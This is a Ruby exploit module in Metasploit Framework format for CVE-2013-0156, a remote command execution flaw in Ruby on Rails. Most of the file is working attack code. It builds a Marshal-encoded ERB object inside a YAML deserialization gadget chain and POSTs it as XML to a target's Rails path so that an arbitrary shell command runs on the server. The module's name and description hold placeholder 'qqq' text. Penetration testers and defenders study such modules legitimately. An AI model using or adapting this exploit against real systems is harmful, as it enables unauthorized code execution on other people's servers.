##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Rails qqq Remote Command Execution',
			'Description'    => %q{
					This module exploits a vulnerability qqq
			},
			'Author'         =>
				[
					'charliesome', # PoC
					'espes' # PoC, Metasploit module
				],
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					[ 'CVE', '2013-0156' ]
				],
			'Privileged'     => false, # web server context
			'Payload'        =>
				{
					'DisableNops' => true,
					'Compat'      =>
						{
							'PayloadType' => 'cmd',
							'RequiredCmd' => 'generic ruby bash telnet'
						}
				},
			'Platform'       => [ 'unix' ],
			'Arch'           => ARCH_CMD,
			'Targets'        => [[ 'Automatic', { }]],
			'DisclosureDate' => 'Jan 7 2013',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('TARGETURI', [ true, "Rails path", "/" ])
			], self.class)
	end

	def exploit

		code = "`#{payload.encoded}`"

		inner_payload = Rex::Text.encode_base64(
			"\x04\x08" + 
			"o"+":\x40ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy"+"\x07" +
				":\x0E@instance" +
					"o"+":\x08ERB"+"\x06" + 
						":\x09@src" +
							Marshal.dump(code)[2..-1] +
				":\x0C@method"+":\x0Bresult"
		)

		payload = <<-PAYLOAD.strip.gsub("\n", "&#10;")
<lol type="yaml">
--- !ruby/object:Gem::Requirement
  requirements:
  - !ruby/object:Rack::Session::Abstract::SessionHash
    env:
      HTTP_COOKIE: a=#{inner_payload}
    by: !ruby/object:Rack::Session::Cookie
      coder: !ruby/object:Rack::Session::Cookie::Base64::Marshal {}
      key: a
      secrets: []
    exists: true
</lol>
PAYLOAD
		
		res = send_request_cgi({
			'uri'     => datastore['TARGETURI'],
			'method'  => 'POST',
			'ctype'   => "text/xml",
			'data'    => payload
		})

		print_status("Sent exploit request")

		if res and res.code != 200
			print_error("Server returned non-200 status code (#{res.code})")
		end
	end

end